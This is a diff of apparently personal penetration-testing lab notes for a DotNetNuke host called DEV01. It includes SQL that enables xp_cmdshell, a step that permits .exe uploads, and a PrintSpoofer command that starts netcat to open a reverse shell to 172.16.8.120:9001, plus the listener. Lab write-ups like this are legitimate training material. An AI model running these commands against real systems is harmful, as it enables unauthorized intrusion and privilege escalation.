@@ -1339,9 +1339,10 @@ echo "172.16.8.3 DC01.INLANEFREIGHT.LOCAL DC01" | sudo tee -a /etc/hosts
 
 ## DEV01 (172.16.8.20)
 
-Web enum:
+Web enum discloses a dotnetnuke instance:
 
-![](./dev01/dev)
+![](./dev01/1.png)
+
 mounting the nfsshare:
 
 ```
@@ -1393,10 +1394,14 @@ bundleconfig.json   CKEditorOptions.ascx.designer.cs  CKHtmlEditorProvider.cs   
 </configuration>                                                                                                                                                  
 ```
 
+Accessing as admin the dnn dashboard:
+
+![](./dev01/2.png)
+
 Reference used to enumerate dotnetnuke:
 https://hacktricks.wiki/en/network-services-pentesting/pentesting-web/dotnetnuke-dnn.html
 
-
+By enabling the xp_cmdhsell its possible to execute commands:
 
 ```sql
 EXEC sp_configure 'show advanced options', 1;
@@ -1404,7 +1409,10 @@ RECONFIGURE;
 EXEC sp_configure 'xp_cmdshell', 1;
 RECONFIGURE;
 GO
+xp_cmdshell 'whoami';
 ```
+
+![](./dev01/3.png)
 
 running:
 
@@ -1414,15 +1422,21 @@ xp_cmdshell 'whoami /priv';
 
 reveals seimpersonateprivilege:
 
-adding the .exe estensions
+![](./dev01/4.png)
 
-img
+adding the .exe estension to upload PrintSpoofer64.exe and nc64.exe
 
-uploading nc and print
+**`Settings → Security → More → More Security Settings`**
+
+![](./dev01/5.png)
+
+uploading nc and printSpoofer
 
 ```sql
 xp_cmdshell 'c:\dotnetnuke\portals\0\PrintSpoofer64.exe -c "c:\dotnetnuke\portals\0\nc64.exe 172.16.8.120 9001 -e cmd"';
 ```
+
+![](./dev01/6.png)
 
 ```
 $ nc -lvnp 9001
